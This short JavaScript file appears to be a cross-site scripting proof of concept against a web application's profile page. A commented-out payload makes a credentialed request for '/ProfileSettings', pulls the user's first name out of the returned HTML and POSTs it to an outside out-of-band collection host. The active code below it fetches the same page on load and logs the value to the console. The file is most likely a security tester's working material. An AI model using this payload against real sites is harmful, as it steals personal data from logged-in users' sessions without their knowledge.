//xhr=new XMLHttpRequest();
//xhr.open('GET','/ProfileSettings#general');
//xhr.withCredentials=true;
//xhr.onreadystatechange=()=>{if(xhr.readyState==4){dom=new DOMParser().parseFromString(xhr.response,'text/html');var firstName = dom.querySelector('[data-bind="text: firstName"]').textContent;xhr=new XMLHttpRequest();xhr.open("POST","https://kypdqokutkzjkenfltayept3ry0mphyy4.oast.fun");xhr.send(`firstName=${firstName}`);}};
//xhr.send();

document.addEventListener('DOMContentLoaded', () => {
  fetch('/ProfileSettings')
    .then(response => response.text()) 
    .then(html => {
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, 'text/html');
      
      const dataElement = doc.querySelector('[data-bind="text: firstName"]');
      if (dataElement) {
        console.log('Data found in y.html:', dataElement.textContent);
      } else {
        console.log('Element not found in y.html');
      }
    })
    .catch(error => {
      console.error('Error fetching y.html:', error);
    });
});
